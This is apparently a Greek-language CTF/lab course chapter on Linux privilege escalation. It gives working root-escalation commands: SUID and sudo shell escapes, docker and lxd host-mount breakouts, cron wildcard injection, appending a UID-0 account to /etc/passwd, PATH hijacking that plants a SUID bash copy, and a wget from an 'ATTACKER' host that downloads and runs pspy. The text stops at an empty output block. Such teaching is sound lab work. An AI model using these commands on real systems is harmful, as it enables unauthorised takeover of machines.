# 05 — Αναβάθμιση Προνομίων στο Linux

> Διαβάστε **πριν** από τα Μηχανήματα 1, 3, 6, 7, 8, 9, 10, 11, 12 και 13 — δηλαδή σχεδόν όλα.
> Αυτό είναι το κεφάλαιο με τις περισσότερες τεχνικές στη διαδρομή, και είναι επίσης **η σειρά
> ελέγχου που πρέπει να αποστηθίσετε**.

---

## 0. Τι είναι αναβάθμιση προνομίων και γιατί υπάρχει

Μπήκατε μέσα. Αλλά ως **ποιος**;

```bash
id
```
```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**`www-data`** είναι ο λογαριασμός υπό τον οποίο τρέχει ο Apache στο Debian/Ubuntu. Δεν έχει
χρήσιμο κωδικό, δεν έχει αρχικό κατάλογο, και **δεν μπορεί να διαβάσει σχεδόν τίποτα** εκτός από
το web root. Στην πραγματικότητα είναι **σχεδιασμένο έτσι**: αν η εφαρμογή χακαριστεί, ο
ζημιωμένος πρέπει να είναι ελάχιστος.

**Αναβάθμιση προνομίων (privilege escalation)** είναι το να γίνετε **διαχειριστής**: `root` στο
Linux, `SYSTEM` στα Windows.

| Τι μπορεί ένας απλός χρήστης | Τι μπορεί ο root |
| --- | --- |
| Διαβάζει τα δικά του αρχεία | Διαβάζει **όλα** τα αρχεία |
| Τρέχει δικά του προγράμματα | Φορτώνει modules στον πυρήνα |
| Δεν αλλάζει ρυθμίσεις συστήματος | **Αλλάζει κάθε κωδικό** |
| Δεν βλέπει τις διεργασίες άλλων | Εγκαθιστά backdoor που επιζεί επανεκκίνησης |

**Σε CTF:** η σημαία του root διαβάζεται μόνο από root. **Σε πραγματικό έργο:** η διαφορά μεταξύ
«ένας web λογαριασμός διαρρέει» και «ολόκληρη η υποδομή ελέγχεται».

### Η σειρά ελέγχου — αποστηθίστε την

```text
 1. id, sudo -l, uname -a           ← ποιός είμαι, τι επιτρέπεται, τι kernel
 2. SUID / SGID                     ← find / -perm -u=s -type f
 3. Linux capabilities              ← getcap -r /        ← ΟΙ ΠΕΡΙΣΣΟΤΕΡΟΙ ΤΟ ΞΕΧΝΟΥΝ
 4. Ομάδες                          ← docker, lxd, disk, adm
 5. Cron / χρονοπρογραμματισμένα    ← /etc/crontab, cron.d, και pspy
 6. Εγγράψιμα αρχεία                ← scripts, config, /etc/passwd
 7. PATH hijacking                  ← SUID που καλεί εντολή με σκέτο όνομα
 8. Kernel exploit                  ← ΤΕΛΕΥΤΑΙΑ επιλογή
```

**Γιατί αυτή η σειρά.** Από το **φθηνότερο προς το ακριβότερο**: το 1 διαβάζεται σε ένα
δευτερόλεπτο, το 8 απαιτεί μεταγλώττιση, μπορεί να ρίξει το μηχάνημα, και είναι το λιγότερο
αξιόπιστο. **Οι περισσότεροι αρχάριοι πηδούν κατευθείαν στο 8.**

---

## 1. Οι τρεις πρώτοι έλεγχοι

### 1.1 `id` — και η διαφορά real vs effective

```bash
id
```

```text
uid=1002(robot) gid=1002(robot) euid=0(root) egid=0(root) groups=0(root),1002(robot)
```

**Αυτή η γραμμή είναι το πιο παρεξηγημένο πράγμα στο Linux.** Υπάρχουν **τρία** UID:

| Πεδίο | Όνομα | Τι σημαίνει |
| --- | --- | --- |
| `uid` | **πραγματικό (real)** | Ποιος **είστε** — ποιος σας ξεκίνησε |
| `euid` | **ενεργό (effective)** | Ποιος **ελέγχει τις άδειες** — αυτό κοιτάζει ο πυρήνας |
| (suid) | saved | Αποθηκευμένο για επαναφορά |

**Ο πυρήνας χρησιμοποιεί το `euid` για κάθε έλεγχο πρόσβασης.** Άρα `uid=1002` με `euid=0`
σημαίνει: **έχετε πλήρη δικαιώματα root χωρίς να αλλάξατε ταυτότητα.** Το `whoami` μπορεί να
τυπώσει το όνομα του απλού χρήστη ενώ εσείς διαβάζετε το `/etc/shadow`.

**Το `euid` εμφανίζεται στην έξοδο μόνο όταν διαφέρει από το `uid`.** Αν δείτε απλώς
`uid=0(root) gid=0(root) groups=0(root)`, είστε πραγματικά root.

### 1.2 `sudo -l` — η πιο παραγωγική εντολή της διαδρομής

```bash
sudo -l
```

```text
Matching Defaults entries for jerry on DC-2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git
```

**Ανάγνωση ως συμβόλαιο — κάθε μέρος ξεχωριστά:**

| Μέρος | Σημασία |
| --- | --- |
| `(root)` | **Ως ποιον** μπορείτε να τρέξετε — εδώ root |
| `NOPASSWD:` | **Δεν θα ζητηθεί κωδικός.** Χωρίς αυτό, χρειάζεστε τον κωδικό του χρήστη |
| `/usr/bin/git` | **Το μόνο** πρόγραμμα που επιτρέπεται |
| `env_reset` | **Μηδενίζει το περιβάλλον** — σκοτώνει το PATH hijacking |
| `secure_path=…` | **Αντικαθιστά πλήρως** το `PATH` σας — επίσης σκοτώνει το PATH hijacking |
| `(ALL : ALL) ALL` | **Τέλος παιχνιδιού.** Οποιοσδήποτε χρήστης, οποιαδήποτε ομάδα, οποιαδήποτε εντολή |

**Τα τέσσερα πιθανά αποτελέσματα:**

| Αποτέλεσμα | Τι κάνετε |
| --- | --- |
| `sudo: command not found` | **Δεν υπάρχει καν sudo** (slim container, Μηχάνημα 13) → SUID/capabilities |
| `User is not allowed to run sudo` | Κανένα δικαίωμα → επόμενο βήμα |
| `(root) NOPASSWD: /usr/bin/XYZ` | **Ψάξτε το XYZ στο [GTFOBins](https://gtfobins.github.io/)** |
| `(ALL : ALL) ALL` **με** κωδικό | Χρειάζεστε κωδικό — ψάξτε για επανάχρηση |

> ### 📖 Σύνοψη — Γιατί το GTFOBins κερδίζει τα περισσότερα μηχανήματα
>
> Όταν ο διαχειριστής γράφει `(root) NOPASSWD: /usr/bin/git`, πιστεύει ότι παραχωρεί **ένα
> πρόγραμμα**. Στην πραγματικότητα παραχωρεί **οτιδήποτε μπορεί να κάνει αυτό το πρόγραμμα**.
> Το `git` μπορεί να τρέξει έναν pager (`less`), ο οποίος υποστηρίζει `!CMD`, το οποίο τρέχει
> **κέλυφος**. Άρα: `sudo git -p help config` → μέσα στον pager `!/bin/sh` → **root**.
>
> Το ίδιο ισχύει για `find -exec`, `tar`, `awk`, `vim`, `python`, `zip`, `less`, `man`, `nmap`
> (παλιές εκδόσεις), `env`, `cp`, `mv`, `perl`, `ruby`, `tcpdump`… **Όλα είναι
> καταχωρημένα στο [GTFOBins](https://gtfobins.github.io/).** Αν δείτε οποιοδήποτε από αυτά στο
> `sudo -l`, τελειώσατε.

### 1.3 Πληροφορίες συστήματος

```bash
uname -a
cat /etc/os-release
hostname
cat /proc/version
```

```text
Linux pwnlab 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt11-1 (2015-05-13) i686 GNU/Linux
```
```text
PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"
NAME="Debian GNU/Linux"
VERSION_ID="11"
ID=debian
```

**Τι διαβάζετε στο `uname -a`:**
- **`3.16.0-4-686-pae`** — η έκδοση kernel **και** η αρχιτεκτονική. **`i686` = 32-bit**,
  **`x86_64` = 64-bit**. Αυτό περιορίζει ποια exploits μπορείτε να μεταγλωττίσετε.
- **`Debian 3.16.7-ckt11-1 (2015-05-13)`** — **η ημερομηνία του πακέτου.** Ένα kernel του 2015
  σημαίνει **εννέα χρόνια χωρίς patches** → Dirty COW (2016) πιθανότατα λειτουργεί. Ένα kernel
  του 2020 (Μηχάνημα 11) σημαίνει ότι **και το Dirty COW και το overlayfs έχουν διορθωθεί**.
- **`#1 SMP`** — χτισμένο με υποστήριξη πολλαπλών πυρήνων.

**Αυτή η γραμμή είναι που αποφασίζει αν το βήμα 8 (kernel exploit) είναι καν στον ορίζοντα.**

---

## 2. SUID και SGID

### 2.1 Τι είναι

**SUID (set-user-ID)** είναι ένα bit άδειας που κάνει ένα πρόγραμμα να τρέχει με τα
**δικαιώματα του κατόχου του αρχείου**, όχι αυτού που το καλεί.

**Υπάρχει για καλό λόγο:** το `/usr/bin/passwd` είναι SUID-root ώστε ένας απλός χρήστης να
μπορεί να αλλάξει τον κωδικό του — πράγμα που απαιτεί εγγραφή στο `/etc/shadow`, αρχείο που
διαβάζεται μόνο από root. Το πρόγραμμα είναι γραμμένο να κάνει **μόνο αυτό**.

**Το πρόβλημα:** αν το πρόγραμμα SUID-root μπορεί να κάνει **οτιδήποτε άλλο** — να τρέξει
κέλυφος, να γράψει αρχείο, να διαβάσει οποιοδήποτε αρχείο — τότε δίνει root.

### 2.2 Το κυνήγι

```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null      # ισοδύναμο, οκταδικό
find / -perm /6000 -type f 2>/dev/null      # SUID Ή SGID
```

**`-perm -u=s` και `-perm -4000` είναι το ίδιο πράγμα.** Το αρχικό `-` κάνει το ταίριασμα
**υποσύνολο** («έχει τουλάχιστον αυτά τα bits»).

```text
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/passwd
/usr/bin/php7.2                ← !!!
```

**Η δεξιότητα είναι η σύγκριση με τη βάση.** Τα εννέα πρώτα είναι **απολύτως φυσιολογικά** σε
Debian/Ubuntu. Το δέκατο **δεν είναι**.

### 2.3 Ανάγνωση της συμβολοσειράς αδειών — θέση προς θέση

```bash
ls -l /usr/bin/php7.2
```

```text
-rwsr-xr-x 1 root root 4538528 Jan 14  2020 /usr/bin/php7.2
 ││││ ││ │ │    │    │        │             └ όνομα
 ││││ ││ │ │    │    │        └ τελευταία τροποποίηση
 ││││ ││ │ │    │    └ μέγεθος
 ││││ ││ │ │    └ ομάδα = root
 ││││ ││ │ └ κάτοχος = root   ← ΑΥΤΟ καθορίζει το euid
 ││││ ││ └ άλλοι: r-x
 ││││ └── ομάδα: r-x
 ││└┴──── κάτοχος: r-w + **s**
 │└─────── **s** = SUID! (στη θέση εκτέλεσης του κατόχου)
 └──────── τύπος: - αρχείο
```

| Στη θέση εκτέλεσης βλέπετε | Σημασία |
| --- | --- |
| `x` | Εκτελέσιμο, χωρίς ειδικό bit |
| **`s`** (πεζό) | **SUID/SGID + εκτελέσιμο** |
| **`S`** (κεφαλαίο) | **SUID/SGID αλλά ΜΗ εκτελέσιμο** — σπασμένη ρύθμιση, εύρημα! |

**Οκταδικά:** `4755` = SUID + 755. Το **`4`** μπροστά δεν είναι μέρος των τριών ψηφίων των
δικαιωμάτων — είναι το ειδικό bit. `2755` = SGID, `1755` = **sticky bit** (για καταλόγους).

### 2.4 Οι τρεις κατηγορίες εκμετάλλευσης SUID

| Μηχανισμός | Παράδειγμα | Μηχάνημα |
| --- | --- | --- |
| **Ο ίδιος ο εκτελέσιμος είναι κέλυφος ή διερμηνέας** | `/usr/bin/php7.2`, παλιό `nmap --interactive` | 11, 7 |
| **Το εκτελέσιμο τρέχει άλλη εντολή με σκέτο όνομα** | `msgmike` → `cat`, `statuscheck` → `curl` | **PATH hijacking** — 10, 12 |
| **Το εκτελέσιμο δέχεται είσοδο χρήστη σε κέλυφος** | `msg2root` → `/bin/echo %s >> file` | **Command injection** — 10 |

**Οι δύο τελευταίες βρίσκονται με το `strings`:**

```bash
strings /home/kane/msgmike | grep -iE 'cat|/bin|/usr|echo|system'
```

```text
cat /home/mike/msg.txt
```

**`cat` χωρίς `/` μπροστά = η ευπάθεια.** Αν έβλεπε `/bin/cat /home/mike/msg.txt`, δεν θα
υπήρχε πρόβλημα.

### 2.5 Η διαφυγή — και γιατί το `-p` είναι υποχρεωτικό

```bash
find . -exec /bin/sh -p \; -quit
id
```

```text
uid=1002(robot) gid=1002(robot) euid=0(root) egid=0(root) groups=0(root),1002(robot)
```

**`-p` = privileged mode.** Το bash **εσκεμμένα αφήνει το effective UID** στην εκκίνηση, εκτός
αν κληθεί με `-p`. Αυτό είναι ρητή άμυνα ενάντια ακριβώς σε αυτή την επίθεση. **Χωρίς `-p`
παίρνετε `$` αντί για `#` και συμπεραίνετε λανθασμένα ότι η αναβάθμιση απέτυχε.** Αυτό είναι
**το υπ' αριθμόν ένα λάθος** στα Μηχανήματα 3, 6, 7, 11, 13.

**`-quit`** σταματά μετά το πρώτο ταίριασμα — αλλιώς παίρνετε **ένα κέλυφος ανά κατάλογο**.

---

## 3. Linux Capabilities — ο μηχανισμός που όλοι ξεχνούν

### 3.1 Τι είναι

Τα capabilities **σπάνε το «root» σε ~40 ξεχωριστά δικαιώματα**. Αντί για ένα δυαδικό
«είσαι root ή δεν είσαι», κάθε διεργασία έχει ένα **σύνολο από μεμονωμένες άδειες πυρήνα**.

| Capability | Τι επιτρέπει |
| --- | --- |
| **`cap_dac_override`** | **Παράκαμψη κάθε ελέγχου άδειας** (read/write/exec) → **root για αρχεία** |
| **`cap_dac_read_search`** | **Παράκαμψη ελέγχου ανάγνωσης αρχείων και αναζήτησης καταλόγων** → διαβάζετε τα πάντα |
| **`cap_setuid`** | **Αλλαγή του UID σας** → `os.setuid(0)` = root σε μία γραμμή |
| **`cap_setgid`** | Αλλαγή του GID |
| **`cap_chown`** | Αλλαγή κατόχου **οποιουδήποτε** αρχείου |
| **`cap_fowner`** | Παράκαμψη ελέγχου «είμαι κάτοχος;» |
| **`cap_sys_admin`** | «Το νέο root» — mount, namespaces, πολλά |
| **`cap_sys_module`** | **Φόρτωση module στον πυρήνα** → απόλυτος έλεγχος |
| **`cap_sys_ptrace`** | **Εισαγωγή σε άλλες διεργασίες** → κλέψτε credentials από μια διεργασία root |
| **`cap_net_raw`** | Raw sockets — **φυσιολογικό** για το `ping` |
| **`cap_net_bind_service`** | Δέσμευση θύρας < 1024 |

### 3.2 Το κυνήγι

```bash
getcap -r / 2>/dev/null
```

```text
/home/cyber/tar cap_dac_read_search=ep
/usr/bin/ping cap_net_raw=ep
```

**Ανάγνωση:** *διαδρομή* + *λίστα capabilities*. Το **`=ep`** σημαίνει
**e**ffective + **p**ermitted — δηλαδή **ενεργό**.

`/usr/bin/ping cap_net_raw` είναι **φυσιολογικό** (το ping χρειάζεται raw sockets).
**`cap_dac_read_search` σε ένα `tar` στον αρχικό κατάλογο ενός χρήστη δεν είναι.**

### 3.3 Γιατί το Μηχάνημα 8 κερδίζεται έτσι

```bash
ls -l /home/cyber/tar
```

```text
-rwxr-xr-x 1 root root 531928 Oct 19 15:40 /home/cyber/tar
```

**Διαβάστε το mode προσεκτικά: `-rwxr-xr-x`, ΟΧΙ `-rwsr-xr-x`.** Δεν υπάρχει SUID bit. **Γι'
αυτό η σάρωση `find -perm -4000` δεν βρήκε τίποτα** — και γι' αυτό οι περισσότεροι εγκαταλείπουν
σε αυτό το μηχάνημα.

**Η επίθεση — σε δύο βήματα, γιατί το `tar` δεν μπορεί να `cat`:**

```bash
./tar -cf backup.tar /var/backups/.old_pass.bak     # 1. αρχειοθέτηση (διαβάζει ως root)
./tar -xf backup.tar                                 # 2. εξαγωγή (γράφει ως εσείς)
cat var/backups/.old_pass.bak
```

```text
./tar: Removing leading '/' from member names
```

**Η προειδοποίηση ΕΙΝΑΙ ο μηχανισμός.** Το tar αφαιρεί το αρχικό `/`, άρα η εξαγωγή
**αναδημιουργεί τη διαδρομή σχετική** με τον τρέχοντα κατάλογο — `./var/backups/.old_pass.bak`,
με **δικό σας** κάτοχο. **Το capability επέτρεψε την ανάγνωση· η εξαγωγή σας έδωσε ένα
ευανάγνωστο αντίγραφο.**

> ### 📖 Το δίδαγμα
>
> **Ένα capability δεν είναι αναβάθμιση προνομίων από μόνο του.** Το `cap_dac_read_search`
> δεν εκτελεί τίποτα και δεν γράφει τίποτα — **μόνο διαβάζει**. Αλλά «διαβάζω οποιοδήποτε
> αρχείο» περιλαμβάνει το `/etc/shadow`, το `/root/.ssh/`, και κάθε αντίγραφο ασφαλείας με
> κωδικούς. **Ποτέ μην ψάχνετε μόνο για SUID.** Το `getcap -r /` ανήκει στη λίστα ελέγχου δίπλα
> στο `find -perm -4000`.

---

## 4. Ομάδες — `docker`, `lxd`, `disk`, `adm`

```bash
id
groups
```

```text
uid=1000(hummingbirdscyber) gid=1000(hummingbirdscyber) groups=1000(hummingbirdscyber),999(docker)
```

**Αν εμφανιστεί `docker`, `lxd`, `libvirt` ή `disk`, έχετε ήδη root.** Χωρίς nuances.

| Ομάδα | Γιατί είναι root |
| --- | --- |
| **`docker`** | Μέλος → **εγγραφή στο socket του daemon** → ο daemon τρέχει **ως root** → μπορείτε να του ζητήσετε container με το `/` του οικοδεσπότη προσαρτημένο |
| **`lxd`** | Ίδιο: μπορείτε να εκκινήσετε **προνομιακό** container (χωρίς user namespace) |
| **`disk`** | **Απευθείας πρόσβαση σε block devices** (`/dev/sda`) → διαβάστε/γράψτε το δίσκο |
| **`adm`** | Ανάγνωση `/var/log/` → **συχνά περιέχει κωδικούς σε αρχεία καταγραφής** |
| **`sudo`** | Σε Ubuntu με `%sudo ALL=(ALL) ALL` → **άμεσο root με κωδικό** |
| **`wheel`** | Το αντίστοιχο σε RHEL/CentOS/Fedora |
| **`video`** | Ανάγνωση framebuffer → **μπορείτε να δείτε την οθόνη** |

### 4.1 Η διαφυγή docker — μία εντολή

```bash
docker run -v /:/host --rm -it alpine chroot /host sh
id
cat /root/flag
```

| Όρος | Σημασία |
| --- | --- |
| `docker run` | Δημιουργία **και** εκκίνηση container |
| **`-v /:/host`** | **Προσάρτηση του `/` του οικοδεσπότη στο `/host`** — **αυτό είναι η επίθεση** |
| `--rm` | Διαγραφή του container κατά την έξοδο (λιγότερα ίχνη) |
| `-it` | Διαδραστικό με TTY |
| `alpine` | Εικόνα 5 MB — τίποτα να κατεβάσετε |
| **`chroot /host sh`** | Αλλαγή του ριζικού καταλόγου στη **προσαρτημένη** ρίζα και εκκίνηση κελύφους |

**Το `chroot /host` είναι το βήμα που οι περισσότεροι ξεχνούν.** Χωρίς αυτό έχετε ένα κέλυφος
*μέσα* σε container που **βλέπει** τα αρχεία του οικοδεσπότη στο `/host`, αλλά τα `/etc/passwd`,
`/root` και εργαλεία σας είναι ακόμα του container. Μετά το `chroot`, η ρίζα του κελύφους
**είναι** η ρίζα του οικοδεσπότη.

**Τρία πράγματα που επιβεβαιώνουν ότι ξεφύγατε:**
1. Το `hostname` είναι το **πραγματικό όνομα** του μηχανήματος, όχι ένα 12-δεκαεξαδικό ID
   container.
2. Υπάρχουν πραγματικοί κατάλογοι συστήματος (`/boot`, `/proc/1` = systemd).
3. **`groups=…,999(docker)`** — και αυτή είναι όλη η αναβάθμιση.

### 4.2 Η διαφυγή lxd

```bash
lxc image import ./alpine.tar.gz --alias privesc
lxc init privesc escape -c security.privileged=true
lxc config device add escape host disk source=/ path=/mnt/root recursive=true
lxc start escape
lxc exec escape -- /bin/sh
cat /mnt/root/root/root.txt
```

**Κάθε σημαία είναι φορτωμένη με νόημα:**
- **`-c security.privileged=true`** → **απενεργοποιεί το user namespace**, άρα το root του
  container **είναι** το root του οικοδεσπότη.
- **`disk source=/ path=/mnt/root recursive=true`** → **προσαρτά ολόκληρο το `/`** του
  οικοδεσπότη, συμπεριλαμβανομένων των υπο-προσαρτήσεων.
- **`lxc exec … -- /bin/sh`** → κέλυφος μέσα, που βλέπει το πραγματικό σύστημα αρχείων.

**Καθαρισμός:** `lxc stop escape && lxc delete escape && lxc image delete privesc`.

> **Γιατί λειτουργεί:** τα containers **μοιράζονται τον πυρήνα του οικοδεσπότη**. Ένα container
> με `security.privileged=true` δεν έχει user namespace, άρα οι κλήσεις συστήματος εκτελούνται
> με πλήρη δικαιώματα root στον πυρήνα.

---

## 5. Cron και χρονοπρογραμματισμένες εργασίες

### 5.1 Πού να κοιτάξετε

```bash
crontab -l                          # του τρέχοντος χρήστη
sudo crontab -l -u root             # του root (αν επιτρέπεται)
cat /etc/crontab                    # συστήματος
ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/
ls -la /etc/anacrontab
systemctl list-timers --all         # **systemd timers — τα σύγχρονα cron**
```

### 5.2 Ανάγνωση του `/etc/crontab`

```text
# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
*  *    * * *   root    /usr/bin/python /opt/md5check.py
```

**Τα πεδία:** `λεπτό ώρα ημέρα-μηνός μήνας ημέρα-εβδομάδας **ΧΡΗΣΤΗΣ** εντολή`.

**Η στήλη του χρήστη υπάρχει ΜΟΝΟ στο `/etc/crontab`** (όχι στα per-user crontabs). **Αυτή η
στήλη είναι που κάνει μια εργασία συστήματος να τρέχει ως root.**

**Διαβάστε επίσης τη γραμμή `PATH=`** — είναι αυτή που καθορίζει αν το PATH hijacking είναι
καν δυνατό. Αν το `PATH` του cron **δεν** περιέχει κατάλογο που μπορείτε να γράψετε, αυτή η
τεχνική δεν λειτουργεί.

### 5.3 Τα τρία εκμεταλλεύσιμα μοτίβα

| # | Μοτίβο | Εκμετάλλευση |
| --- | --- | --- |
| **1** | **Το ίδιο το script είναι εγγράψιμο** | Γράψτε μέσα του: `cp /bin/bash /tmp/rb; chown root:root /tmp/rb; chmod 4755 /tmp/rb`. Περιμένετε. Τρέξτε `/tmp/rb -p` |
| **2** | **Καλεί εκτελέσιμο με σκέτο όνομα** (`service`, `tar`, `python`) | **PATH hijack**: φτιάξτε `~/evil/service` με το payload σας, `export PATH=~/evil:$PATH`. **Ελέγξτε πρώτα το `PATH=` του cron** |
| **3** | **Wildcard injection** — `tar czf backup.tar.gz *` | Δημιουργήστε αρχεία με ονόματα `--checkpoint=1` και `--checkpoint-action=exec=/tmp/shell.sh`. Το `tar` τα διαβάζει **ως επιλογές**, όχι ως ονόματα |

### 5.4 `pspy` — για τις εργασίες που δεν μπορείτε να δείτε

**Το κρίσιμο κενό:** root εργασίες που **δεν εμφανίζονται σε κανένα crontab**. Μπορεί να είναι
`systemd` timer, ή ένας βρόχος `while true; sleep 5` κάτω από init script, ή εργασία που την
τρέχει άλλη υπηρεσία.

**Το `ps` και το `/proc` δείχνουν μόνο ό,τι τρέχει *αυτή τη στιγμή*.** Μια εργασία που πυροδοτεί
κάθε 5 δευτερόλεπτα είναι εύκολο να τη χάσετε ανάμεσα σε δύο ματιές· μία που πυροδοτεί κάθε
5 λεπτά είναι ουσιαστικά αόρατη.

**Το `pspy` δεν χρειάζεται root:** παρακολουθεί γεγονότα **`inotify`** στο `/proc` και
καταγράφει **κάθε** εκκίνηση και έξοδο διεργασίας, με την πλήρη γραμμή εντολών και το UID.

```bash
wget http://ATTACKER:8000/pspy64 && chmod +x pspy64 && ./pspy64
```

```text
pspy - version: v1.2.1 - Commit ID: 07187f2
Config: Printing commands (uid 0-2147483647) and file system events
…
2024-05-04 19:02:11 CMD: UID=0     PID=1842   | /usr/bin/python /opt/md5check.py
2024-05-04 19:02:16 CMD: UID=0     PID=1845   | /usr/bin/python /opt/md5check.py
2024-05-04 19:02:21 CMD: UID=0     PID=1848   | /usr/bin/python /opt/md5check.py
```

**Ανάγνωση:** **`UID=`** ο ενεργός χρήστης που ξεκίνησε τη διεργασία (**0 = root**), **`PID=`**
το αναγνωριστικό, και μετά το τελευταίο `|` η **πλήρης γραμμή εντολών**. Οι χρονικές σφραγίδες
ανά **5 δευτερόλεπτα** αποδεικνύουν ότι είναι χρονοπρογραμματισμένη.

> **Έχει κερδίσει περισσότερα CTF από σχεδόν οποιοδήποτε άλλο εργαλείο.** Αν τα `sudo -l`,
> SUID και capabilities είναι όλα αδιέξοδα, **τρέξτε pspy πριν εγκαταλείψετε.**

### 5.5 Η περίπτωση του Μηχανήματος 9

```bash
ls -l /opt/md5check.py
cat /opt/md5check.py
```

```text
-rwxrwxrwx 1 root root 612 Oct 19 15:40 /opt/md5check.py
```
```python
#!/usr/bin/python
# Verify that /etc/passwd has not been tampered with.
import hashlib, shutil
h = hashlib.md5(open('/etc/passwd','rb').read()).hexdigest()
if h != open('/opt/passwd.md5').read().strip():
    shutil.copy('/opt/passwd.bak','/etc/passwd')
```

**`-rwxrwxrwx` = mode `777`.** Ένα αρχείο **κατόχου root**, που εκτελείται **από root** κάθε
πέντε δευτερόλεπτα, και που **οποιοσδήποτε χρήστης μπορεί να αντικαταστήσει.**

**Αυτή είναι ολόκληρη η αναβάθμιση.** Οι τρεις κανόνες που μια χρονοπρογραμματισμένη εργασία
πρέπει να ικανοποιεί:
1. το script που τρέχει **δεν είναι εγγράψιμο** από χαμηλότερα προνόμια·
2. **δεν εκτελεί ποτέ** κάτι από τοποθεσία εγγράψιμη από όλους·
3. χρησιμοποιεί **απόλυτες διαδρομές** παντού.

**Ο κανόνας 1 είναι παραβιασμένος.** Και η ειρωνεία είναι τέλεια: το script υπάρχει για να
**ανιχνεύει παραποίηση**, και είναι **το ίδιο το μέσο παραποίησης**.

---

## 6. Εγγράψιμα αρχεία και η τεχνική `/etc/passwd`

### 6.1 Πώς να βρείτε τι μπορείτε να γράψετε

```bash
find / -writable -type f -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null | head -40
find /etc /opt /usr/local /var -perm -o+w -type f 2>/dev/null
ls -la /etc/passwd /etc/shadow /etc/sudoers
```

**Τι ψάχνετε:**

| Αρχείο | Αν είναι εγγράψιμο | Αποτέλεσμα |
| --- | --- | --- |
| **`/etc/passwd`** | Προσθέστε λογαριασμό με **UID 0** | **Άμεσο root** |
| **`/etc/shadow`** | Αντικαταστήστε το hash του root | Άμεσο root |
| **`/etc/sudoers`** ή **`/etc/sudoers.d/*`** | Προσθέστε `NOPASSWD:ALL` | Άμεσο root |
| **`/etc/crontab`** | Προσθέστε εργασία ως root | Root σε ένα λεπτό |
| **`.bashrc`** ενός άλλου χρήστη | Backdoor στην επόμενη σύνδεση | Επίμονη πρόσβαση |
| **Script σε cron** | Αντικατάσταση | Root |

### 6.2 Η τεχνική `/etc/passwd` — βήμα προς βήμα

```bash
ls -l /etc/passwd
```

```text
-rw-rw-rw- 1 root root 2011 Dec  7  2017 /etc/passwd
```

**`-rw-rw-rw-` = mode `666`.** Η σωστή άδεια για το `/etc/passwd` είναι **`644`**
(`-rw-r--r--`). **Αυτό το επιπλέον `w` στην τριάδα των «άλλων» είναι ολόκληρη η ευπάθεια**
(Μηχάνημα 1).

```bash
openssl passwd -1 -salt ignite superpassword
echo 'ignite:$1$ignite$XpO6y1nK1vB0yG0yQ3m0o0:0:0:root:/root:/bin/bash' >> /etc/passwd
su ignite
id
```

```text
$1$ignite$XpO6y1nK1vB0yG0yQ3m0o0
```
```text
uid=0(root) gid=0(root) groups=0(root)
```

**Τα επτά πεδία του `/etc/passwd`:**

```text
ignite : $1$ignite$XpO6… : 0 : 0 : root : /root : /bin/bash
   1            2          3   4    5       6        7
```

| # | Πεδίο | Τι βάλατε | Γιατί |
| --- | --- | --- | --- |
| 1 | Όνομα | `ignite` | Οποιοδήποτε |
| 2 | **Κωδικός** | **Πραγματικό hash** | Αν βάλατε `x`, το σύστημα ψάχνει στο `/etc/shadow` — όπου δεν υπάρχει η εγγραφή σας |
| 3 | **UID** | **`0`** | **Αυτό κάνει τον λογαριασμό root** |
| 4 | GID | `0` | Η ομάδα root |
| 5 | GECOS | `root` | Περιγραφή (αδιάφορο) |
| 6 | Home | `/root` | Για να έχετε τα εργαλεία του root |
| 7 | Shell | `/bin/bash` | **Όχι `/usr/sbin/nologin`** — αλλιώς δεν μπαίνετε |

**Χρησιμοποιήστε ΜΟΝΑ εισαγωγικά.** Με διπλά, το `$1$ignite$…` **επεκτείνεται ως μεταβλητές**
και γράφετε `ignite::0:0:root:/root:/bin/bash` — που **αποτυγχάνει με τρόπο που μοιάζει με
πρόβλημα του Linux** και όχι με πρόβλημα παράθεσης.

---

## 7. PATH Hijacking — η πλήρης αλυσίδα

### 7.1 Ο μηχανισμός

Όταν ένα πρόγραμμα καλεί άλλο πρόγραμμα **με σκέτο όνομα** (`service`, `curl`, `cat`, `whoami`)
αντί για **απόλυτη διαδρομή**, το σύστημα ψάχνει **κάθε κατάλογο του `$PATH` με τη σειρά** και
εκτελεί **το πρώτο ταίριασμα**.

```bash
echo $PATH
```

```text
/home/hummingbirdscyber/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

**Αν ελέγχετε κατάλογο που βρίσκεται ΠΡΙΝ από το `/usr/bin`, ελέγχετε ποιο πρόγραμμα θα τρέξει.**

### 7.2 Πώς να βρείτε την ευκαιρία

```bash
strings /usr/local/bin/somehelper | grep -E '^[a-z]+ |/bin/|system|exec'
```

```text
service apache2 status
```

**`service` χωρίς `/` μπροστά = ευπάθεια.** Ένα πλήρως προσδιορισμένο `/usr/sbin/service` δεν
είναι.

```bash
strace -f -e trace=execve /usr/local/bin/somehelper 2>&1 | grep -i exec
```

```text
execve("/usr/local/bin/somehelper", ["/usr/local/bin/somehelper"], 0x7fff...) = 0
execve("/usr/sbin/service", ["service", "apache2", "status"], 0x…) = -1 ENOENT
```

**Ένα `execve("service", …)` χωρίς αρχικό `/` είναι η ευπάθεια**, και το `ENOENT` σημαίνει
«δεν βρέθηκε» — άρα το πρόγραμμα όντως ψάχνει στο PATH.

### 7.3 Η επίθεση

```bash
mkdir -p /home/user/evil
printf '#!/bin/bash\ncp /bin/bash /tmp/rb\nchown root:root /tmp/rb\nchmod 4755 /tmp/rb\n' > /home/user/evil/service
chmod +x /home/user/evil/service
export PATH=/home/user/evil:$PATH
/usr/local/bin/somehelper
/tmp/rb -p
id
```

```text
